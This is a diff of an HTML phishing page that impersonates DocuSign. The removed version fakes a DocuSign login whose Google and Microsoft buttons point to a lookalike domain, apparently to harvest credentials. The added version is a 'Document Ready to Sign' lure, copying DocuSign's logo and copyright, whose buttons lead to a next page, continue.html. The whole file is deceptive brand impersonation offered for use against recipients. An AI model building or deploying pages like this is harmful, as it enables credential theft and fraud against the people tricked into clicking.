@@ -1,180 +1,350 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Log in | DocuSign</title>
-    <style>
-        body {
-            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
-            background-color: #ffffff;
-            display: flex;
-            flex-direction: column;
-            min-height: 100vh;
-            margin: 0;
-            color: #333;
-        }
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Document Ready to Sign</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Source+Sans+3:wght@300;400;600&display=swap');
 
-        .main-content {
-            flex: 1;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding-bottom: 100px; /* Space for footer */
-        }
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 
-        .login-container {
-            width: 100%;
-            max-width: 400px;
-            padding: 20px;
-            text-align: left; /* Aligned left to match 1362.png */
-        }
+    :root {
+      --ds-blue: #1a56a0;
+      --ds-blue-hover: #154a8e;
+      --ds-green: #26a56b;
+      --ds-green-hover: #1e8f5c;
+      --ds-border: #d6dce4;
+      --ds-text: #1a1a2e;
+      --ds-muted: #6b7a8d;
+      --ds-bg: #f4f6f9;
+      --ds-white: #ffffff;
+    }
 
-        .logo {
-            width: 140px;
-            margin-bottom: 40px;
-        }
+    body {
+      font-family: 'Source Sans 3', sans-serif;
+      background: var(--ds-bg);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: space-between;
+      color: var(--ds-text);
+    }
 
-        h1 {
-            font-size: 32px;
-            font-weight: 400;
-            margin-bottom: 10px;
-            color: #1e064b;
-        }
+    /* ── TOP HEADER ── */
+    header {
+      width: 100%;
+      background: var(--ds-white);
+      border-bottom: 1px solid var(--ds-border);
+      padding: 12px 32px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
 
-        .subtitle {
-            font-size: 18px;
-            margin-bottom: 30px;
-        }
+    header img.logo {
+      height: 28px;
+      object-fit: contain;
+    }
 
-        /* Buttons styled to match the DocuSign UI in 1362.png */
-        .auth-button {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            width: 100%;
-            padding: 14px;
-            margin-bottom: 15px;
-            border: 1px solid #ccc;
-            border-radius: 2px;
-            background-color: white;
-            text-decoration: none;
-            color: #333;
-            font-weight: 500;
-            font-size: 16px;
-            transition: background-color 0.2s;
-            box-sizing: border-box;
-        }
+    header .header-meta {
+      font-size: 12px;
+      color: var(--ds-muted);
+      letter-spacing: 0.02em;
+    }
 
-        .auth-button:hover {
-            background-color: #f4f4f4;
-        }
+    /* ── MAIN CARD ── */
+    main {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 40px 16px;
+      width: 100%;
+    }
 
-        .auth-button img {
-            width: 20px;
-            height: 20px;
-            margin-right: 12px;
-        }
+    .card {
+      background: var(--ds-white);
+      border: 1px solid var(--ds-border);
+      border-radius: 6px;
+      width: 100%;
+      max-width: 520px;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.07);
+      overflow: hidden;
+    }
 
-        .signup-btn {
-            background-color: #f0f0f0;
-            border: none;
-            color: #333;
-            margin-top: 10px;
-        }
+    .card-header {
+      background: var(--ds-blue);
+      padding: 22px 28px;
+      display: flex;
+      align-items: center;
+      gap: 14px;
+    }
 
-        /* Footer styling based on 1362.png */
-        footer {
-            border-top: 1px solid #e5e5e5;
-            padding: 20px 40px;
-            font-size: 12px;
-            color: #666;
-            background: white;
-        }
+    .card-header .doc-icon {
+      width: 40px;
+      height: 48px;
+      background: rgba(255,255,255,0.15);
+      border-radius: 3px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+    }
 
-        .footer-top {
-            display: flex;
-            align-items: center;
-            margin-bottom: 15px;
-        }
+    .card-header .doc-icon svg {
+      width: 22px;
+      height: 22px;
+      fill: white;
+    }
 
-        .footer-links {
-            display: flex;
-            flex-wrap: wrap;
-            align-items: center;
-            gap: 15px;
-        }
+    .card-header-text h2 {
+      font-size: 16px;
+      font-weight: 600;
+      color: white;
+      letter-spacing: 0.01em;
+    }
 
-        .footer-links a {
-            color: #666;
-            text-decoration: none;
-        }
+    .card-header-text p {
+      font-size: 12px;
+      color: rgba(255,255,255,0.75);
+      margin-top: 2px;
+    }
 
-        .footer-links a:hover {
-            text-decoration: underline;
-        }
+    .card-body {
+      padding: 32px 28px;
+      text-align: center;
+    }
 
-        .lang-selector {
-            background: #f4f4f4;
-            padding: 5px 10px;
-            border-radius: 4px;
-            margin-right: 20px;
-            display: flex;
-            align-items: center;
-            cursor: pointer;
-        }
+    .sender-info {
+      font-size: 13px;
+      color: var(--ds-muted);
+      margin-bottom: 24px;
+      line-height: 1.6;
+    }
 
-        .copyright {
-            margin-top: 10px;
-        }
-    </style>
+    .sender-info strong {
+      color: var(--ds-text);
+      font-weight: 600;
+    }
+
+    /* ── BUTTONS ── */
+    .btn-group {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      margin-bottom: 20px;
+    }
+
+    .btn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      padding: 12px 24px;
+      border-radius: 4px;
+      font-family: inherit;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      text-decoration: none;
+      transition: background 0.18s, box-shadow 0.18s;
+      border: none;
+      letter-spacing: 0.02em;
+    }
+
+    .btn-primary {
+      background: var(--ds-green);
+      color: white;
+      box-shadow: 0 2px 6px rgba(38,165,107,0.3);
+    }
+
+    .btn-primary:hover {
+      background: var(--ds-green-hover);
+      box-shadow: 0 3px 10px rgba(38,165,107,0.4);
+    }
+
+    .btn-secondary {
+      background: transparent;
+      color: var(--ds-blue);
+      border: 1.5px solid var(--ds-blue);
+    }
+
+    .btn-secondary:hover {
+      background: rgba(26,86,160,0.05);
+    }
+
+    .btn svg {
+      width: 16px;
+      height: 16px;
+      flex-shrink: 0;
+    }
+
+    .divider {
+      border: none;
+      border-top: 1px solid var(--ds-border);
+      margin: 20px 0;
+    }
+
+    .help-text {
+      font-size: 12px;
+      color: var(--ds-muted);
+    }
+
+    .help-text a {
+      color: var(--ds-blue);
+      text-decoration: none;
+    }
+
+    .help-text a:hover {
+      text-decoration: underline;
+    }
+
+    /* ── FOOTER ── */
+    footer {
+      width: 100%;
+      background: var(--ds-white);
+      border-top: 1px solid var(--ds-border);
+      padding: 14px 32px;
+    }
+
+    .footer-inner {
+      max-width: 900px;
+      margin: 0 auto;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 10px;
+    }
+
+    .footer-logo img {
+      height: 18px;
+      opacity: 0.55;
+      object-fit: contain;
+    }
+
+    .footer-links {
+      display: flex;
+      gap: 20px;
+      list-style: none;
+    }
+
+    .footer-links a {
+      font-size: 11.5px;
+      color: var(--ds-muted);
+      text-decoration: none;
+      transition: color 0.15s;
+    }
+
+    .footer-links a:hover {
+      color: var(--ds-blue);
+      text-decoration: underline;
+    }
+
+    .footer-copy {
+      font-size: 11px;
+      color: #aab2bd;
+    }
+
+    /* ── PRINT / PDF STYLES ── */
+    @media print {
+      body { background: white; }
+      header, .card, footer { box-shadow: none !important; }
+      .btn-group { display: none; }
+    }
+  </style>
 </head>
 <body>
 
-<div class="main-content">
-    <div class="login-container">
-        <!-- DocuSign Logo -->
-        <img src="https://docucdn-a.akamaihd.net/olive/images/2.72.0/global-assets/ds-logo-default.svg" alt="DocuSign" class="logo">
-        
-        <h1>Log in to DocuSign</h1>
-        <p class="subtitle">Select your login method.</p>
+  <!-- HEADER -->
+  <header>
+    <img
+      class="logo"
+      src="https://docucdn-a.akamaihd.net/olive/images/2.72.0/global-assets/ds-logo-default.svg"
+      alt="DocuSign"
+      onerror="this.style.display='none'; this.nextElementSibling.style.display='block'"
+    />
+    <span style="display:none; font-size:18px; font-weight:700; color:#1a56a0; letter-spacing:-0.5px;">DocuSign</span>
+    <span class="header-meta"> </span>
+  </header>
 
-        <!-- Social Login Buttons -->
-        <a href="https://app.drive0g5folderaccess.com/" class="auth-button">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" alt="Google">
-            Continue with Google
-        </a>
+  <!-- MAIN -->
+  <main>
+    <div class="card">
 
-        <a href="https://officehome365.drive0g5folderaccess.com/" class="auth-button">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft">
-            Continue with Microsoft
-        </a>
-
-        <a href="#" class="auth-button signup-btn">Sign Up for Free</a>
-    </div>
-</div>
-
-<footer>
-    <div class="footer-top">
-        <span style="margin-right: 10px;">Powered by</span>
-        <img src="https://docucdn-a.akamaihd.net/olive/images/2.72.0/global-assets/ds-logo-default.svg" alt="DocuSign" style="height: 14px;">
-    </div>
-    
-    <div class="footer-links">
-        <div class="lang-selector">
-            English (US) <span style="margin-left: 8px; font-size: 10px;">▼</span>
+      <div class="card-header">
+        <div class="doc-icon">
+          <!-- document icon -->
+          <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+            <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8l-6-6zm-1 1.5L18.5 9H13V3.5zM6 20V4h5v7h7v9H6z"/>
+          </svg>
         </div>
-        <a href="#">Contact Us</a>
-        <a href="#">Terms of Use</a>
-        <a href="#">Privacy</a>
-        <a href="#">Intellectual Property</a>
-        <a href="#">Trust</a>
-    </div>
+        <div class="card-header-text">
+          <h2>Document Ready for Review</h2>
+          <p>Please open and read before proceeding</p>
+        </div>
+      </div>
 
-    <div class="copyright">
-        Copyright © 2026 DocuSign, Inc. All rights reserved
+      <div class="card-body">
+
+        <p class="sender-info">
+          <strong>Sender</strong> has sent you a document via DocuSign.<br>
+          Please review the document carefully before signing.
+        </p>
+
+        <div class="btn-group">
+          <!-- Open / Sign button -->
+          <a href="continue.html" class="btn btn-primary">
+            <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/>
+              <path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/>
+            </svg>
+            Review &amp; Sign Document
+          </a>
+
+          <!-- Read / View only button -->
+          <a href="continue.html" class="btn btn-secondary">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+              <circle cx="12" cy="12" r="3"/>
+            </svg>
+            View Document Only
+          </a>
+        </div>
+
+        <hr class="divider" />
+
+        <p class="help-text">
+          Questions? <a href="#">Contact Support</a> &nbsp;·&nbsp;
+          <a href="#">Privacy Policy</a> &nbsp;·&nbsp;
+          <a href="#">Terms of Use</a>
+        </p>
+
+      </div>
     </div>
-</footer>
+  </main>
+
+  <!-- FOOTER -->
+  <footer>
+    <div class="footer-inner">
+      <div class="footer-logo">
+        <img
+          src="https://docucdn-a.akamaihd.net/olive/images/2.72.0/global-assets/ds-logo-default.svg"
+          alt="DocuSign"
+          onerror="this.style.display='none'"
+        />
+      </div>
+      <ul class="footer-links">
+        <li><a href="#">About DocuSign</a></li>
+        <li><a href="#">Privacy</a></li>
+        <li><a href="#">Terms</a></li>
+        <li><a href="#">Help</a></li>
+      </ul>
+      <span class="footer-copy">© 2026 DocuSign Inc. All rights reserved.</span>
+    </div>
+  </footer>
 
 </body>
 </html>
